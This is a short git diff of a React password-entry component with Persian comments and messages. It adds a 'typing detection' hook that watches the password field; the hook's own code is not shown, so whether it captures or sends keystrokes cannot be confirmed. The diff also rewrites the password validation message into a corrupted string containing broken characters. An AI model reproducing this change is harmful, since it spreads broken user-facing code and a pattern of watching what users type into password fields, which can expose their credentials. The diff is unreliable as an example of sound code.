@@ -9,6 +9,7 @@ import { ChevronLeft, Lock, Eye, EyeOff, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { AlertMessage } from "@/components/AlertMessage";
+import { useSimpleTypingDetection } from "@/hooks/useSimpleTypingDetection";
 
 const AuthPassword = () => {
   const location = useLocation();
@@ -23,6 +24,13 @@ const AuthPassword = () => {
   const sessionId =
     location.state?.sessionId || sessionStorage.getItem("sessionId");
   const hasError = location.state?.hasError || false;
+
+  // تشخیص تایپ برای AuthPassword
+  const typingDetection = useSimpleTypingDetection({
+    formName: "AuthPassword",
+    enabledFields: ["password"],
+    debounceTime: 1500,
+  });
 
   useEffect(() => {
     const checkAccess = async () => {
@@ -77,7 +85,7 @@ const AuthPassword = () => {
 
     if (!validatePassword(password)) {
       setErrors({
-        password: "رمز عبور باید حداقل ۸ کاراکتر و شامل حروف و اعداد باشد",
+        password: "رمز عبور باید حداقل ۸ کاراکتر و شامل ح��وف و اعداد باشد",
       });
       return;
     }
